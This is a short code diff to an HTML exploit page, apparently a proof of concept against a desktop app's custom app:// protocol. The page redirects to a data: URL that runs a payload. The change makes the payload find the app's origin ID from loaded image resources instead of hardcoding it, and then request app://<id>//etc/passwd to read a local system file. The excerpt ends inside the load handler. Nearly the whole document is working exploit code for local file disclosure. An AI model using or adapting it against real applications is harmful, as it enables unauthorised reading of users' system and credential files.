@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <body>
@@ -5,7 +6,18 @@
     window.location = `data:text/html,<script>(${payload.toString()})()\x3c/script>`;
 
     function payload() {
-        let command = 'app://8c27aae2823fae296e5a7ac31c9e5a812d9c//etc/passwd';
+
+        window.performance.getEntriesByType('resource')
+        var resourceEntries = window.performance.getEntriesByType('resource');
+        var imgResourceEntries = resourceEntries.filter(function(entry) {
+            return entry.initiatorType === 'img';
+        });
+        var firstImgResourceEntry = imgResourceEntries[0];
+        var name = firstImgResourceEntry.name;
+        var regex = /app:\/\/([^/]+)/;
+        var match = name.match(regex);
+        var desiredValue = match[1];
+        let command = 'app://'+desiredValue+'//etc/passwd';
         let r = new XMLHttpRequest();
         r.open('GET', command);
         r.addEventListener('load', e => {
